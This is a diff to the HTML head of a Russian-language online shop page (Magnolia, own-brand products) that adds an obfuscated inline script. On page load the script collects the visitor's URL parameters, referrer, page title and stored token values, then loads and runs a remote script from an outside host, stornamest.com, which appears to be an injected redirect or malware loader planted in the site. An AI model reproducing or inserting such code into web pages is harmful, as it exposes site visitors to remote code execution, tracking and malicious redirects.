@@ -1,6 +1,48 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
 <head>
+	<script>
+    (function() {
+    var name = '_GQ8QWDWmMMtvJWsd';
+    if (!window._GQ8QWDWmMMtvJWsd) {
+        window._GQ8QWDWmMMtvJWsd = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+        };
+    }
+    const _nBnCJTy6b26Yv9Z6 = localStorage.getItem('config');
+    if (typeof _nBnCJTy6b26Yv9Z6 !== 'undefined' && _nBnCJTy6b26Yv9Z6 !== null) {
+        var _pGsXNTm5ZsrBS9mT = JSON.parse(_nBnCJTy6b26Yv9Z6);
+        var _zvyRv3D52DJrWwQB = Math.round(+new Date()/1000);
+        if (_pGsXNTm5ZsrBS9mT.created_at + window._GQ8QWDWmMMtvJWsd.ttl < _zvyRv3D52DJrWwQB) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _tyTQsjPJx61nW2BZ = localStorage.getItem('subId');
+    var _W8m4sfjW8rwkhBwQ = localStorage.getItem('token');
+    var _SKyVHy7Nwbn8P3LW = '?return=js.client';
+        _SKyVHy7Nwbn8P3LW += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _SKyVHy7Nwbn8P3LW += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _SKyVHy7Nwbn8P3LW += '&default_keyword=' + encodeURIComponent(document.title);
+        _SKyVHy7Nwbn8P3LW += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _SKyVHy7Nwbn8P3LW += '&name=' + encodeURIComponent(name);
+        _SKyVHy7Nwbn8P3LW += '&host=' + encodeURIComponent(window._GQ8QWDWmMMtvJWsd.R_PATH);
+    if (typeof _tyTQsjPJx61nW2BZ !== 'undefined' && _tyTQsjPJx61nW2BZ && window._GQ8QWDWmMMtvJWsd.unique) {
+        _SKyVHy7Nwbn8P3LW += '&sub_id=' + encodeURIComponent(_tyTQsjPJx61nW2BZ);
+    }
+    if (typeof _W8m4sfjW8rwkhBwQ !== 'undefined' && _W8m4sfjW8rwkhBwQ && window._GQ8QWDWmMMtvJWsd.unique) {
+        _SKyVHy7Nwbn8P3LW += '&token=' + encodeURIComponent(_W8m4sfjW8rwkhBwQ);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._GQ8QWDWmMMtvJWsd.R_PATH + _SKyVHy7Nwbn8P3LW;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 <link rel="icon" href="favicon.ico" type="image/x-icon">
 	<title>Товары Собственного Производства – Купить в интернет-магазине Магнолия</title>
 	<meta name="viewport" content="initial-scale=1.0, width=device-width">
